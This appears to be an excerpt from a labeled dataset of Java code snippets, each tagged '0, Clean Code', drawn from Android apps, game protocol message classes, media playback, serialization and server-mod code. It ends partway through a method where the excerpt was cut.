public PreferencesDialog(PreferenceGroup initialGroup,boolean initialSetup){
  final DialogPane dialogPane=getDialogPane();
  AppServices.setStageIcon(dialogPane.getScene().getWindow());
  try {
    FXMLLoader preferencesLoader=new FXMLLoader(AppServices.class.getResource(""preferences/preferences.fxml""));
    dialogPane.setContent(Borders.wrap(preferencesLoader.load()).emptyBorder().buildAll());
    PreferencesController preferencesController=preferencesLoader.getController();
    preferencesController.initializeView(Config.get());
    if (initialGroup != null) {
      preferencesController.selectGroup(initialGroup);
    }
 else {
      preferencesController.selectGroup(PreferenceGroup.GENERAL);
    }
    final ButtonType closeButtonType=new javafx.scene.control.ButtonType(""Close"",ButtonBar.ButtonData.CANCEL_CLOSE);
    dialogPane.getButtonTypes().addAll(closeButtonType);
    final ButtonType newWalletButtonType=new javafx.scene.control.ButtonType(""Create New Wallet"",ButtonBar.ButtonData.OK_DONE);
    if (initialSetup) {
      dialogPane.getButtonTypes().addAll(newWalletButtonType);
    }
    dialogPane.setPrefWidth(750);
    dialogPane.setPrefHeight(630);
    dialogPane.setMinHeight(dialogPane.getPrefHeight());
    AppServices.moveToActiveWindowScreen(this);
    preferencesController.reconnectOnClosingProperty().set(AppServices.isConnecting() || AppServices.isConnected());
    setOnCloseRequest(event -> {
      preferencesController.closingProperty().set(true);
      if (preferencesController.isReconnectOnClosing() && !(AppServices.isConnecting() || AppServices.isConnected())) {
        EventManager.get().post(new RequestConnectEvent());
      }
    }
);
    setResultConverter(dialogButton -> dialogButton == newWalletButtonType ? Boolean.TRUE : null);
  }
 catch (  IOException e) {
    throw new RuntimeException(e);
  }
}",0,Clean Code
"public GroupCreateActivity(){
  super();
}
public GroupCreateActivity(Bundle args){
  super(args);
  chatType=args.getInt(""chatType"",ChatObject.CHAT_TYPE_CHAT);
  forImport=args.getBoolean(""forImport"",false);
  isAlwaysShare=args.getBoolean(""isAlwaysShare"",false);
  isNeverShare=args.getBoolean(""isNeverShare"",false);
  addToGroup=args.getBoolean(""addToGroup"",false);
  chatAddType=args.getInt(""chatAddType"",0);
  allowPremium=args.getBoolean(""allowPremium"",false);
  chatId=args.getLong(""chatId"");
  channelId=args.getLong(""channelId"");
  if (isAlwaysShare || isNeverShare || addToGroup) {
    maxCount=0;
  }
 else {
    maxCount=chatType == ChatObject.CHAT_TYPE_CHAT ? getMessagesController().maxMegagroupCount : getMessagesController().maxBroadcastCount;
  }
}",0,Clean Code
"public Map<String,Boolean> getConfPartMetaInfo(){
  Map<String,Boolean> configMap=new HashMap<>();
  for (  Map.Entry<String,Tuple2<Partition,Integer>> entry : configuredPartInfoMap.entrySet()) {
    if (entry == null || entry.getKey() == null || entry.getValue() == null) {
      continue;
    }
    configMap.put(entry.getKey(),(entry.getValue().getF1() == 1));
  }
  return configMap;
}",0,Clean Code
"@Override protected void before(MethodHookParam param) throws Throwable {
  param.setResult(true);
}
@Override protected void before(MethodHookParam param) throws Throwable {
  param.setResult(true);
}
",0,Clean Code
"private void onScaleInternal(float focusX,float focusY,float scale){
  if (mScroll || (mLayoutManager != null && !mLayoutManager.canScale())) {
    return;
  }
  mScale=true;
  if (mLayoutManager != null) {
    mLayoutManager.onScale(focusX,focusY,scale);
  }
}
",0,Clean Code
"private static boolean isValidUserID(@Nullable String userID){
  if (null == userID || LENGTH_USER_ID != userID.length()) {
    return false;
  }
  for (int i=0; i < LENGTH_USER_ID; i++) {
    char ch=userID.charAt(i);
    if (!(ch >= '0' && ch <= '9') && !(ch >= 'a' && ch <= 'z')) {
      return false;
    }
  }
  return true;
}",0,Clean Code
"private void register(Path dir) throws IOException {
  if (dir == null) {
    return;
  }
  String dirName=dir.toAbsolutePath().toString();
  logger.info(dirName);
  Matcher matcher=patternWithoutFileName.matcher(dirName);
  String rootDir=Paths.get(basicStaticPath).toAbsolutePath().toString();
  Paths.get(basicStaticPath).toAbsolutePath().getNameCount();
  if (!pathToKeys.containsKey(dirName) && (matcher.matches() || rootDir.equals(dirName))) {
    WatchKey key=dir.register(watchService,StandardWatchEventKinds.ENTRY_CREATE);
    keys.put(key,dir);
    pathToKeys.put(dirName,key);
    logger.info(""Register a new directory: "" + dir.toAbsolutePath().toString());
  }
}
",0,Clean Code
"/** 
 * <code>repeated .ItemCost item_list = 13;</code>
 * @return this
 */
public PromoteAvatarCsReq clearItemList(){
  bitField0_&=~0x00000002;
  itemList.clear();
  return this;
}",0,Clean Code
"/** 
 * Creates a new state object after we entered edit mode.
 * @param n The node which has entered edit mode.
 * @param event The mouse event that caused the state change.
 * @return The state object that describes the mouse state.
 */
public IMouseState createNodeEditEnterState(final Node n,final MouseEvent event){
  final CNodeEditEnterState state=new CNodeEditEnterState(this,m_graph,n);
  m_factory.createNodeEditEnterAction().execute(state,event);
  return state;
}
",0,Clean Code
"public static String artifactToPath(DependentLibrary library){
  if (library.downloads != null && library.downloads.artifact != null && library.downloads.artifact.path != null)   return library.downloads.artifact.path;
  String[] libInfos=library.name.split("":"");
  return libInfos[0].replaceAll(""\\."",""/"") + ""/"" + libInfos[1]+ ""/""+ libInfos[2]+ ""/""+ libInfos[1]+ ""-""+ libInfos[2]+ "".jar"";
}",0,Clean Code
"@Override protected ZyEditMode<CombinedDiffNode,CombinedDiffEdge> createEditMode(){
  return new CombinedGraphEditMode(this);
}
",0,Clean Code
"/** 
 * <code>optional string bin_version = 3;</code>
 * @return the binVersion
 */
public String getBinVersion(){
  return binVersion.getString();
}",0,Clean Code
"public BulkResponse delete(URI uri,Object body){
  if (body != null) {
    return client.resource(uri).type(MediaType.APPLICATION_JSON_TYPE).delete(BulkResponse.class,body);
  }
 else {
    client.resource(uri).delete();
  }
  return null;
}
",0,Clean Code
"public GroupCreateActivity(){
  super();
}
public GroupCreateActivity(Bundle args){
  super(args);
  chatType=args.getInt(""chatType"",ChatObject.CHAT_TYPE_CHAT);
  forImport=args.getBoolean(""forImport"",false);
  isAlwaysShare=args.getBoolean(""isAlwaysShare"",false);
  isNeverShare=args.getBoolean(""isNeverShare"",false);
  addToGroup=args.getBoolean(""addToGroup"",false);
  chatAddType=args.getInt(""chatAddType"",0);
  chatId=args.getLong(""chatId"");
  channelId=args.getLong(""channelId"");
  if (isAlwaysShare || isNeverShare || addToGroup) {
    maxCount=0;
  }
 else {
    maxCount=chatType == ChatObject.CHAT_TYPE_CHAT ? getMessagesController().maxMegagroupCount : getMessagesController().maxBroadcastCount;
  }
}",0,Clean Code
"/** 
 * <code>optional string top_sever_region_name = 3;</code>
 * @param value the topSeverRegionName to set
 * @return this
 */
public DispatchRegionData setTopSeverRegionName(final CharSequence value){
  bitField0_|=0x00000004;
  topSeverRegionName.copyFrom(value);
  return this;
}
/** 
 * <code>optional string top_sever_region_name = 3;</code>
 * @param value the topSeverRegionName to set
 * @return this
 */
public DispatchRegionData setTopSeverRegionName(final Utf8String value){
  bitField0_|=0x00000004;
  topSeverRegionName.copyFrom(value);
  return this;
}",0,Clean Code
"/** 
 * Block copy characters from one position in the screen to another. The two positions can overlap. All characters of the source and destination must be within the bounds of the screen, or else an InvalidParameterException will be thrown.
 * @param sx source X coordinate
 * @param sy source Y coordinate
 * @param w  width
 * @param h  height
 * @param dx destination X coordinate
 * @param dy destination Y coordinate
 */
public void blockCopy(int sx,int sy,int w,int h,int dx,int dy){
  if (w == 0)   return;
  if (sx < 0 || sx + w > mColumns || sy < 0 || sy + h > mScreenRows || dx < 0 || dx + w > mColumns || dy < 0 || dy + h > mScreenRows)   throw new IllegalArgumentException();
  boolean copyingUp=sy > dy;
  for (int y=0; y < h; y++) {
    int y2=copyingUp ? y : (h - (y + 1));
    TerminalRow sourceRow=allocateFullLineIfNecessary(externalToInternalRow(sy + y2));
    allocateFullLineIfNecessary(externalToInternalRow(dy + y2)).copyInterval(sourceRow,sx,sx + w,dx);
  }
}",0,Clean Code
"/** 
 * @param id See {@link #id}.
 * @param type See {@link #type}.
 * @param uri See {@link #uri}.
 * @param streamKeys See {@link #streamKeys}.
 * @param customCacheKey See {@link #customCacheKey}.
 * @param data See {@link #data}.
 */
public DownloadRequest(String id,String type,Uri uri,List<StreamKey> streamKeys,@Nullable String customCacheKey,@Nullable byte[] data){
  if (TYPE_DASH.equals(type) || TYPE_HLS.equals(type) || TYPE_SS.equals(type)) {
    Assertions.checkArgument(customCacheKey == null,""customCacheKey must be null for type: "" + type);
  }
  this.id=id;
  this.type=type;
  this.uri=uri;
  ArrayList<StreamKey> mutableKeys=new ArrayList<>(streamKeys);
  Collections.sort(mutableKeys);
  this.streamKeys=Collections.unmodifiableList(mutableKeys);
  this.customCacheKey=customCacheKey;
  this.data=data != null ? Arrays.copyOf(data,data.length) : Util.EMPTY_BYTE_ARRAY;
}
DownloadRequest(Parcel in){
  id=castNonNull(in.readString());
  type=castNonNull(in.readString());
  uri=Uri.parse(castNonNull(in.readString()));
  int streamKeyCount=in.readInt();
  ArrayList<StreamKey> mutableStreamKeys=new ArrayList<>(streamKeyCount);
  for (int i=0; i < streamKeyCount; i++) {
    mutableStreamKeys.add(in.readParcelable(StreamKey.class.getClassLoader()));
  }
  streamKeys=Collections.unmodifiableList(mutableStreamKeys);
  customCacheKey=in.readString();
  data=new byte[in.readInt()];
  in.readByteArray(data);
}",0,Clean Code
"@Override public String getJoinSign(){
  return this.mInfo.getJoinSign();
}
",0,Clean Code
"@Override protected void onConfigurationChanged(Configuration newConfig){
  super.onConfigurationChanged(newConfig);
  boolean newLightStatus=((newConfig.uiMode & Configuration.UI_MODE_NIGHT_MASK) == Configuration.UI_MODE_NIGHT_NO);
  if (isLightMode != newLightStatus && DialogX.globalTheme == DialogX.THEME.AUTO && getParentDialog() != null) {
    getParentDialog().restartDialog();
  }
}
",0,Clean Code
"public String toString(){
  return ""GProWorldChannelPresence{cover="" + this.cover + "",schema=""+ this.schema+ "",historyMemberTotal=""+ this.historyMemberTotal+ "",}"";
}
",0,Clean Code
"@NonNull @Override public Dialog onCreateDialog(Bundle savedInstanceState){
  mActivity=requireActivity();
  String[] suggestions=requireArguments().getStringArray(QUERY_SUGGESTIONS);
  String logFilename=SaveLogHelper.createLogFilename();
  mLogLevel=Prefs.LogViewer.getLogLevel();
  mFilterQuery="""";
  return new TextInputDialogBuilder(mActivity,R.string.enter_filename).setTitle(R.string.record_log).setInputText(logFilename).setPositiveButton(R.string.ok,(dialog,which,inputText,isChecked) -> {
    if (SaveLogHelper.isInvalidFilename(inputText)) {
      Toast.makeText(mActivity,R.string.enter_good_filename,Toast.LENGTH_SHORT).show();
    }
 else {
      String filename=inputText.toString();
      Context context=mActivity.getApplicationContext();
      ThreadUtils.postOnBackgroundThread(() -> {
        Intent intent=ServiceHelper.getLogcatRecorderServiceIfNotAlreadyRunning(context,filename,mFilterQuery,mLogLevel);
        ThreadUtils.postOnMainThread(() -> {
          if (intent != null) {
            ContextCompat.startForegroundService(context,intent);
          }
          if (mListener != null && !(mActivity.isFinishing() || mActivity.isDestroyed())) {
            mListener.onServiceStarted();
          }
        }
);
      }
);
    }
  }
).setNegativeButton(R.string.cancel,(dialog,which,inputText,isChecked) -> WidgetHelper.updateWidgets(mActivity)).setNeutralButton(R.string.text_filter_ellipsis,null).setOnShowListener(dialog -> {
    AlertDialog dialog1=(AlertDialog)dialog;
    Button filterButton=dialog1.getButton(AlertDialog.BUTTON_NEUTRAL);
    filterButton.setOnClickListener(v -> {
      WidgetHelper.updateWidgets(mActivity);
      showFilterDialogForRecording(suggestions != null ? Arrays.asList(suggestions) : Collections.emptyList());
    }
);
  }
).create();
}",0,Clean Code
"private boolean shouldShowQuoteButton(){
  if (!hasSelection() || getSelectionStart() < 0 || getSelectionEnd() < 0 || getSelectionStart() == getSelectionEnd()) {
    return false;
  }
  Editable text=getText();
  if (text == null) {
    return false;
  }
  QuoteSpan.QuoteStyleSpan[] spans=((Spanned)text).getSpans(getSelectionStart(),getSelectionEnd(),QuoteSpan.QuoteStyleSpan.class);
  return spans == null || spans.length == 0;
}",0,Clean Code
"/** 
 * <code>optional string name = 6;</code>
 * @return whether the name field is set
 */
public boolean hasName(){
  return (bitField0_ & 0x00000004) != 0;
}",0,Clean Code
"private void updatePinnedTopicStarterMessage(){
  topicStarterMessageObject=isTopic && !pinnedMessageObjects.isEmpty() && pinnedMessageIds.size() == 1 ? pinnedMessageObjects.get(pinnedMessageIds.get(0)) : null;
  if (isTopic && topicStarterMessageObject != null && topicStarterMessageObject.messageOwner != null && forumTopic != null && !MessageObject.peersEqual(forumTopic.from_id,topicStarterMessageObject.messageOwner.from_id) && !MessageObject.peersEqual(currentChat,topicStarterMessageObject.messageOwner.from_id)) {
    topicStarterMessageObject=null;
  }
}",0,Clean Code
"@EventHandler public void onChat(ChatEvent event){
  if (event.getMessage().startsWith(""/server "") && event.getSender() instanceof ProxiedPlayer && proxiedPlayer.hasPermission(""multipaper.directserverconnect"")) {
    usingServerCommand.add((ProxiedPlayer)event.getSender());
  }
}
",0,Clean Code
"@WorkerThread @GuardedBy(""blockerLocker"") public void setPackageChanged(){
  setPackageInfo(true);
  if (mExternalApk || mExecutor.isShutdown() || mExecutor.isTerminated())   return;
  mExecutor.submit(() -> {
synchronized (mBlockerLocker) {
      try {
        waitForBlockerOrExit();
        mBlocker.reloadComponents();
      }
  finally {
        mBlockerLocker.notifyAll();
      }
    }
  }
);
}
",0,Clean Code
"@Override public J.Assignment visitAssignment(J.Assignment assignment,ExecutionContext ctx){
  if (assignment.getVariable() instanceof J.Identifier && ""callSuper"".equals(((J.Identifier)assignment.getVariable()).getSimpleName()) && J.Literal.isLiteralValue(assignment.getAssignment(),true)) {
    return assignment.withAssignment(((J.Literal)assignment.getAssignment()).withValue(false).withValueSource(""false""));
  }
  return super.visitAssignment(assignment,ctx);
}
",0,Clean Code
"IGProUser getReceiverMember();
",0,Clean Code
"@Override public boolean isVisible(){
  return rawBasicblock.isVisible();
}
",0,Clean Code
"@Select(GET_USER_ROLE_FILED) List<Map<String,String>> getUserRoleField(@Param(""userId"") Long userId,@Param(""moduleId"") Long moduleId,@Param(""version"") Integer version);
",0,Clean Code
"/** 
 * @param list 鍘烲ist
 * @param len 鎸夊闀胯繘琛屽垎鍓�
 * @return List<List<?>> 鍒嗗壊鍚庣殑鏁扮粍
 */
@Comment(""鍒嗗壊List"") @Example(""${list.split(listVar,10)}"") public static List<List<?>> split(List<?> list,int len){
  List<List<?>> result=new ArrayList<>();
  if (list == null || list.size() == 0 || len < 1) {
    return result;
  }
  int size=list.size();
  int count=(size + len - 1) / len;
  for (int i=0; i < count; i++) {
    List<?> subList=list.subList(i * len,((i + 1) * len > size ? size : len * (i + 1)));
    result.add(subList);
  }
  return result;
}",0,Clean Code
"public OllamaOptions withMirostatTau(Float mirostatTau){
  this.mirostatTau=mirostatTau;
  return this;
}
",0,Clean Code
"protected void onUserNickUpdate(String str,String str2){
}",0,Clean Code
"public String toString(){
  return ""GProGetRecommendQuickJoinRsp{recommendQuickJoinItems="" + this.recommendQuickJoinItems + "",}"";
}
",0,Clean Code
"public Integer getVideoSource(){
  return this.videoSource;
}
",0,Clean Code
"PropertiesChromaConnectionDetails(ChromaApiProperties properties){
  this.properties=properties;
}
",0,Clean Code
"@Override public IGProActiveUser getActiveUser(){
  return null;
}
",0,Clean Code
"public void scale(float scale){
  this.scale*=scale;
  float newScale=Math.max(this.scale,0.1f);
  newScale=Utilities.clamp(newScale,getMaxScale(),getMinScale());
  if (allowHaptic() && (newScale >= getMaxScale() || newScale <= getMinScale())) {
    try {
      performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP,HapticFeedbackConstants.FLAG_IGNORE_VIEW_SETTING);
    }
 catch (    Exception ignore) {
    }
  }
  setScaleX(newScale);
  setScaleY(newScale);
}",0,Clean Code
"@Override public IGProChannelUserNum getChannelUserNum(){
  return new GGProChannelUserNum(this.mInfo.getChannelUserNum());
}
",0,Clean Code
"/** 
 * <code>optional uint32 entity_id = 7;</code>
 * @return this
 */
public RogueNpcDisappearCsReq clearEntityId(){
  bitField0_&=~0x00000001;
  entityId=0;
  return this;
}",0,Clean Code
"@Override public void onLongPress(MotionEvent motionEvent){
  if (PlayerActivity.locked || (getPlayer() != null && getPlayer().isPlaying())) {
    PlayerActivity.locked=!PlayerActivity.locked;
    isHandledLongPress=true;
    Utils.showText(this,"""",MESSAGE_TIMEOUT_LONG);
    setIconLock(PlayerActivity.locked);
    if (PlayerActivity.locked && PlayerActivity.controllerVisible) {
      hideController();
    }
  }
}
",0,Clean Code
"public GProAreaLevel(){
  this.desc="""";
}
public GProAreaLevel(int i2,String str){
  this.desc="""";
  this.level=i2;
  this.desc=str;
}",0,Clean Code
"public BasicBlockMatchesPie3dPanel(final Diff diff,final boolean includeUnmatchedFunctions){
  super(new BorderLayout());
  checkNotNull(diff);
  includeUnmtachedFunctions=includeUnmatchedFunctions;
  this.diff=diff;
  piePanel=new Pie3dPanel(getTitle(),dataset,new CustomLabelGenerator());
  piePanel.setSectionColor(PLOTS[MATCHED_BASICBLOCKS],Colors.PIE_MATCHED);
  piePanel.setSectionColor(PLOTS[PRIMRAY_UNMATCHED_BASICBLOCKS],Colors.PIE_PRIMARY_UNMATCHED);
  piePanel.setSectionColor(PLOTS[SECONDARY_UNMATCHED_BASICBLOCKS],Colors.PIE_SECONDARY_UNMATCHED);
  piePanel.setTooltipGenerator(new CustomTooltipGenerator());
  add(piePanel,BorderLayout.CENTER);
  if (includeUnmtachedFunctions) {
    diff.getMetadata().addListener(changeListener);
    updateDataset();
  }
}",0,Clean Code
"@Override public Map<?,?> xread(MemoryBuffer buffer){
  buffer.readVarUint32Small7();
  Object key=fury.xreadRef(buffer);
  Object value=fury.xreadRef(buffer);
  return Collections.singletonMap(key,value);
}",0,Clean Code
"@Override public void onDragEnd(float velocity){
  if (!allowDragging()) {
    return;
  }
  stickersDragging=false;
  if ((wasExpanded && velocity >= dp(200)) || (!wasExpanded && velocity <= dp(-200)) || (wasExpanded && stickersExpansionProgress <= 0.6f)|| (!wasExpanded && stickersExpansionProgress >= 0.4f)) {
    setStickersExpanded(!wasExpanded,true,true);
  }
 else {
    setStickersExpanded(wasExpanded,true,true);
  }
}",0,Clean Code
"public String toString(){
  return ""GProUserGiftInfo{giftPrice="" + this.giftPrice + "",showGiftPrice=""+ this.showGiftPrice+ "",giftTipsMsg=""+ this.giftTipsMsg+ "",}"";
}
",0,Clean Code
"@Override public ReplaceLineupCsReq copyFrom(final ReplaceLineupCsReq other){
  cachedSize=other.cachedSize;
  if ((bitField0_ | other.bitField0_) != 0) {
    bitField0_=other.bitField0_;
    planeId=other.planeId;
    index=other.index;
    leaderSlot=other.leaderSlot;
    extraLineupType=other.extraLineupType;
    isVirtual=other.isVirtual;
    slots.copyFrom(other.slots);
  }
  return this;
}",0,Clean Code
"@Override public boolean equals(Object o){
  if (o == this) {
    return true;
  }
  if (!(o instanceof SyncRogueFinishScNotify)) {
    return false;
  }
  SyncRogueFinishScNotify other=(SyncRogueFinishScNotify)o;
  return bitField0_ == other.bitField0_ && (!hasFinishInfo() || finishInfo.equals(other.finishInfo));
}",0,Clean Code
"/** 
 * @return a new empty instance of {@code ChessRogueNousStoryInfo}
 */
public static ChessRogueNousStoryInfo newInstance(){
  return new ChessRogueNousStoryInfo();
}
",0,Clean Code
"@Override public boolean onTouchEvent(MotionEvent ev){
  if (!isInAllApps()) {
    return false;
  }
  if (ev.getAction() == MotionEvent.ACTION_DOWN) {
    AllAppsRecyclerView rv=getActiveRecyclerView();
    if (rv != null && rv.getScrollbar() != null && rv.getScrollbar().isHitInParent(ev.getX(),ev.getY(),mFastScrollerOffset)) {
      mTouchHandler=rv.getScrollbar();
    }
 else {
      mTouchHandler=null;
    }
  }
  if (mTouchHandler != null) {
    mTouchHandler.handleTouchEvent(ev,mFastScrollerOffset);
    return true;
  }
  if (isSearching() && mActivityContext.getDragLayer().isEventOverView(getVisibleContainerView(),ev)) {
    return true;
  }
  return false;
}
",0,Clean Code
"public static boolean shouldForceHide(String repoId){
  if (BuildConfig.DEBUG || repoId.startsWith(""repo_"") || repoId.equals(""magisk_alt_repo""))   return false;
  return !repoId.startsWith(""repo_"") && (INSTANCE.getCompatibilityFlags(repoId) & FLAG_COMPAT_FORCE_HIDE) != 0;
}",0,Clean Code
"@Override public void addFocusables(ArrayList<View> views,int direction,int focusableMode){
  if (DEBUG)   Log.v(TAG,""addFocusables"");
  if (hasFocus() || getGrandChildCount() == 0 || !shouldPersistFocusFromDirection(direction)) {
    super.addFocusables(views,direction,focusableMode);
  }
 else {
    views.add(this);
  }
}",0,Clean Code
"@Override public View.OnClickListener addRestartListener(){
  return view -> ((BaseSettingsActivity)getActivity()).showRestartDialog(getResources().getString(R.string.joyose),""com.xiaomi.joyose"");
}
",0,Clean Code
"/** 
 * <code>optional uint32 bubble_id = 5;</code>
 * @return the bubbleId
 */
public int getBubbleId(){
  return bubbleId;
}",0,Clean Code
"@Override public void intercept(HttpRequest httpRequest){
  this.log(httpRequest);
}
",0,Clean Code
"/** 
 * Skips checks for existing keys, doesn't increment size. 
 */
private void putResize(K key,V value){
  K[] keyTable=this.keyTable;
  int mask=this.mask;
  for (int i=place(key); ; i=(i + 1) & mask) {
    if (keyTable[i] == null) {
      keyTable[i]=key;
      valueTable[i]=value;
      return;
    }
  }
}",0,Clean Code
"@Override public IMouseStateChange mouseReleased(final MouseEvent event,final AbstractZyGraph<?,?> graph){
  return new CStateChange(m_factory.createNodeClickedLeftState(m_node,event),false);
}
",0,Clean Code
"/** 
 * @return a new empty instance of {@code BattleTargetList}
 */
public static BattleTargetList newInstance(){
  return new BattleTargetList();
}
",0,Clean Code
"public static BottomDialog show(CharSequence title,CharSequence message){
  BottomDialog bottomDialog=new BottomDialog(title,message);
  bottomDialog.show();
  return bottomDialog;
}
public static BottomDialog show(int titleResId,int messageResId){
  BottomDialog bottomDialog=new BottomDialog(titleResId,messageResId);
  bottomDialog.show();
  return bottomDialog;
}
public static BottomDialog show(CharSequence title,CharSequence message,OnBindView<BottomDialog> onBindView){
  BottomDialog bottomDialog=new BottomDialog(title,message,onBindView);
  bottomDialog.show();
  return bottomDialog;
}
public static BottomDialog show(int titleResId,int messageResId,OnBindView<BottomDialog> onBindView){
  BottomDialog bottomDialog=new BottomDialog(titleResId,messageResId,onBindView);
  bottomDialog.show();
  return bottomDialog;
}
public static BottomDialog show(CharSequence title,OnBindView<BottomDialog> onBindView){
  BottomDialog bottomDialog=new BottomDialog(title,onBindView);
  bottomDialog.show();
  return bottomDialog;
}
public static BottomDialog show(int titleResId,OnBindView<BottomDialog> onBindView){
  BottomDialog bottomDialog=new BottomDialog(titleResId,onBindView);
  bottomDialog.show();
  return bottomDialog;
}
public static BottomDialog show(OnBindView<BottomDialog> onBindView){
  BottomDialog bottomDialog=new BottomDialog(onBindView);
  bottomDialog.show();
  return bottomDialog;
}
public BottomDialog show(){
  if (isHide && getDialogView() != null && isShow) {
    if (hideWithExitAnim && getDialogImpl() != null) {
      getDialogView().setVisibility(View.VISIBLE);
      getDialogImpl().getDialogXAnimImpl().doShowAnim(me,getDialogImpl().bkg);
    }
 else {
      getDialogView().setVisibility(View.VISIBLE);
    }
    return this;
  }
  super.beforeShow();
  if (getDialogView() == null) {
    int layoutId=isLightTheme() ? R.layout.layout_dialogx_bottom_material : R.layout.layout_dialogx_bottom_material_dark;
    if (style.overrideBottomDialogRes() != null) {
      layoutId=style.overrideBottomDialogRes().overrideDialogLayout(isLightTheme());
    }
    View dialogView=createView(layoutId);
    dialogImpl=new DialogImpl(dialogView);
    if (dialogView != null)     dialogView.setTag(me);
    show(dialogView);
  }
 else {
    show(getDialogView());
  }
  return this;
}
public void show(Activity activity){
  super.beforeShow();
  if (getDialogView() == null) {
    int layoutId=isLightTheme() ? R.layout.layout_dialogx_bottom_material : R.layout.layout_dialogx_bottom_material_dark;
    if (style.overrideBottomDialogRes() != null) {
      layoutId=style.overrideBottomDialogRes().overrideDialogLayout(isLightTheme());
    }
    View dialogView=createView(layoutId);
    dialogImpl=new DialogImpl(dialogView);
    if (dialogView != null)     dialogView.setTag(me);
    show(activity,dialogView);
  }
 else {
    show(activity,getDialogView());
  }
}
",0,Clean Code
"private LanguageType(String name,int number){
  this.name=name;
  this.number=number;
}
",0,Clean Code
"List<? extends ICodeEdge<?>> getBasicBlockEdges();
",0,Clean Code
"@Override protected void onOutputFormatChanged(MediaCodec codec,MediaFormat outputFormat) throws ExoPlaybackException {
  log.i(""onOutputFormatChanged: outputFormat:"" + outputFormat + "", codec:""+ codec);
  @C.Encoding int encoding;
  MediaFormat format;
  if (passthroughMediaFormat != null) {
    format=passthroughMediaFormat;
    encoding=getPassthroughEncoding(format.getInteger(MediaFormat.KEY_CHANNEL_COUNT),format.getString(MediaFormat.KEY_MIME));
  }
 else {
    format=outputFormat;
    encoding=AmazonQuirks.isAmazonDevice() ? MimeTypes.getEncoding(format.getString(MediaFormat.KEY_MIME)) : pcmEncoding;
  }
  int channelCount=format.getInteger(MediaFormat.KEY_CHANNEL_COUNT);
  int sampleRate=format.getInteger(MediaFormat.KEY_SAMPLE_RATE);
  int[] channelMap;
  if (codecNeedsDiscardChannelsWorkaround && channelCount == 6 && this.channelCount < 6) {
    channelMap=new int[this.channelCount];
    for (int i=0; i < this.channelCount; i++) {
      channelMap[i]=i;
    }
  }
 else {
    channelMap=null;
  }
  try {
    audioSink.configure(encoding,channelCount,sampleRate,0,channelMap,encoderDelay,encoderPadding);
  }
 catch (  AudioSink.ConfigurationException e) {
    throw ExoPlaybackException.createForRenderer(e,getIndex());
  }
}",0,Clean Code
"/** 
 * Whether check class schema consistency, will be disabled automatically when  {@link CompatibleMode#COMPATIBLE} is enabled. Do not disable this option unless you can ensure theclass won't evolve.
 */
public FuryBuilder withClassVersionCheck(boolean checkClassVersion){
  this.checkClassVersion=checkClassVersion;
  return this;
}
",0,Clean Code
"@TruffleBoundary public static long roundToLong(double x,RoundingMode mode){
  var z=roundIntermediate(x,mode);
  checkInRange(MIN_LONG_AS_DOUBLE - z < 1.0 & z < MAX_LONG_AS_DOUBLE_PLUS_ONE);
  return (long)z;
}",0,Clean Code
"@Override public void onTaskInProgress(TaskModel task){
  LOGGER.debug(""Task {} is in-progress"",task.getTaskId());
}
",0,Clean Code
"@Redirect(method=""pushItemsTick"",at=@At(value=""INVOKE"",target=""Lnet/minecraft/world/level/block/entity/HopperBlockEntity;tryMoveItems(Lnet/minecraft/world/level/Level;Lnet/minecraft/core/BlockPos;Lnet/minecraft/world/level/block/state/BlockState;Lnet/minecraft/world/level/block/entity/HopperBlockEntity;Ljava/util/function/BooleanSupplier;)Z"")) private static boolean arclight$hopperCheck(Level level,BlockPos pos,BlockState state,HopperBlockEntity hopper,BooleanSupplier flag){
  var result=tryMoveItems(level,pos,state,hopper,flag);
  if (!result && DistValidate.isValid(level) && ((WorldBridge)level).bridge$spigotConfig().hopperCheck > 1) {
    hopper.setCooldown(((WorldBridge)level).bridge$spigotConfig().hopperCheck);
  }
  return result;
}",0,Clean Code
"public static int ways2(int N,int start,int aim,int K){
  if (N < 2 || start < 1 || start > N || aim < 1 || aim > N || K < 1) {
    return -1;
  }
  int[][] dp=new int[N + 1][K + 1];
  for (int i=0; i <= N; i++) {
    for (int j=0; j <= K; j++) {
      dp[i][j]=-1;
    }
  }
  return process2(start,K,aim,N,dp);
}",0,Clean Code
"@Override public int hashCode(){
  return Objects.hash(definedClass,fieldName,fieldType);
}
",0,Clean Code
"/** 
 * Convert an architecture from a String to an int.
 * @param arch The architecture as a String
 * @return The architecture as an int, can be UNSUPPORTED_ARCH if unknown.
 */
public static int archAsInt(String arch){
  arch=arch.toLowerCase().trim().replace("" "","""");
  if (arch.contains(""arm64"") || arch.equals(""aarch64""))   return ARCH_ARM64;
  if (arch.contains(""arm"") || arch.equals(""aarch32""))   return ARCH_ARM;
  if (arch.contains(""x86_64"") || arch.contains(""amd64""))   return ARCH_X86_64;
  if (arch.contains(""x86"") || (arch.startsWith(""i"") && arch.endsWith(""86"")))   return ARCH_X86;
  return UNSUPPORTED_ARCH;
}",0,Clean Code
"/** 
 * <code>optional uint32 question_difficulty = 10;</code>
 * @return this
 */
public ChessRogueNousDiceInfo clearQuestionDifficulty(){
  bitField0_&=~0x00000002;
  questionDifficulty=0;
  return this;
}",0,Clean Code
"private void openProfile(boolean byAvatar){
  if (byAvatar) {
    TLRPC.Chat chat=getCurrentChat();
    if (chat != null && (chat.photo == null || chat.photo instanceof TLRPC.TL_chatPhotoEmpty)) {
      byAvatar=false;
    }
  }
  Bundle args=new Bundle();
  args.putLong(""chat_id"",chatId);
  ProfileActivity fragment=new ProfileActivity(args,avatarContainer.getSharedMediaPreloader());
  fragment.setChatInfo(chatFull);
  fragment.setPlayProfileAnimation(fragmentView.getMeasuredHeight() > fragmentView.getMeasuredWidth() && avatarContainer.getAvatarImageView().getImageReceiver().hasImageLoaded() && byAvatar ? 2 : 1);
  presentFragment(fragment);
}",0,Clean Code
"public void setStartDelay(int startDelay){
  this.startDelay=startDelay;
}
",0,Clean Code
"BasePage<AchievementsTemplatePageVO> queryTemplateList(BasePage<QueryAchievementsTemplateBO> parse,@Param(""templateName"") String templateName);
",0,Clean Code
"/** 
 * Get a  {@code String} from {@link SharedPreferences}.
 * @param sharedPreferences The {@link SharedPreferences} to get the value from.
 * @param key The key for the value.
 * @param def The default value if failed to read a valid value.
 * @param defIfEmpty If set to {@code true}, then  {@code def} will be returned if value is empty.
 * @return Returns the {@code String} value stored in {@link SharedPreferences}, otherwise returns default if failed to read a valid value, like in case of an exception.
 */
public static String getString(SharedPreferences sharedPreferences,String key,String def,boolean defIfEmpty){
  if (sharedPreferences == null) {
